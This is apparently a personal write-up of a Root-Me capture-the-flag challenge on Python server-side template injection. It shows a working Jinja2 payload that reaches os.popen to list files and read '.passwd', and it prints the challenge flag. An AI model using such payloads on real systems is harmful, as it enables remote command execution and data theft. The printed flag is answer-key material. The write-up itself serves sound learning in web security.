---
title: Python - Server-side Template Injection Introduction
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation, rootme]
---

* Points: 25
* Link: [https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction](https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction)

## Statement

> This service allows you to generate a web page. Use it to read the flag!

## Analyzation

Try payload

```
{%raw%}{{ 7*7 }}{%endraw%}
```

It is executed --> the site is vulnerable to SSTI.

## Exploitation

Searching payload in the internet, I got this one work

```py
{%raw%}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}{%endraw%}
```

Change command in ```popen('ls -la')``` to execute shell code.

After reading all files listed above, ```.passwd``` has what I need

```py
{%raw%}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat .passwd').read() }}{%endraw%}
```

The flag is

```
Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!
```

## Resources


- [https://secure-cookie.io/attacks/ssti/](https://secure-cookie.io/attacks/ssti/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)

- [https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/)

- [https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack](https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack)